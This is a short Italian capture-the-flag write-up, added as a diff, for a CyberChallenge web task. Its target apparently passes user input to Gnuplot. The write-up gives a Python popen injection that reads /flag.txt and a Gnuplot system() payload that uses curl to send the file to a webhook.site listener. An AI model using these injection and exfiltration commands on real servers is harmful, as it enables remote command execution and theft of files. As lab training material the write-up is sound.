@@ -1,0 +1,30 @@
+#1 Identificazione del Motore
+
+curl -i -X POST 'http://plottyboy.challs.cyberchallenge.it/render' \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  --data-urlencode "data=__import__('os').popen('cat /flag.txt').read()"
+
+  Nota: ho usato --data-urlencode così curl si occupa di convertire correttamente gli spazi e i caratteri speciali per la rete
+
+#2 Ricerca della Vulnerabilità
+
+Leggendo l'header:
+Content-Disposition: inline; filename="pyGnuPlot_out.png"
+Abbiamo capito che il server non stava solo valutando matematica, ma stava passando il tuo input a un programma esterno chiamato Gnuplot.
+
+Consultando la documentazione di Gnuplot, si scopre la funzione system("comando") che permette di uscire dall'ambiente isolato del programma
+e arrivare alla shell del server.
+
+#3 Prepara il tuo server "ricevente"
+Ti verrà assegnato immediatamente un URL univoco. Copialo. -> Link server: https://webhook.site/
+
+x title system("curl -X POST -d @/flag.txt TUO_LINK") 
+[A POSTO DI TUO_LINK INSERISCI L'URL]
+
+-> -X POST: Invece di una semplice visita (GET), mandiamo dei dati.
+-> -d @/flag.txt: Questa è la "magia" di curl. Il simbolo @ dice a curl: 
+        "Non inviare la parola '/flag.txt', ma apri quel file, leggine il contenuto e invialo come corpo della richiesta".
+
+Webhook.site: Ci serviva un "orecchio" in ascolto su internet che registrasse tutto ciò che il server vulnerabile inviava.
+
+#4 Vai sul sito di webhook e leggi il raw dove ci sara' la flag!
